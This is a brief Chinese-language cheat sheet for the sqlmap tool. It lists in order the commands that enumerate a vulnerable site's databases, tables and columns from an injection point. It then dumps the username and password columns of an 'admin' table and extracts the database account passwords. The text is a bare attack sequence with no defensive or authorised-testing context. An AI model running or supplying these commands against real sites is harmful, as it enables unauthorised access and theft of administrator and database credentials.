注入工具：sqlmap:python27:

1.判断库名：article

sqlmap.py -u "注入点" --dbs

2.判断表名

sqlmap.py -u "注入点" -D article --tables

3.判断列名

sqlmap.py -u "注入点" -D article -T admin --columns



4.判断值：

sqlmap.py -u "注入点" -D article -T admin -C username,password --dump

5.判断连接数据库用户名和密码

sqlmap.py -u "注入点"  --passwords

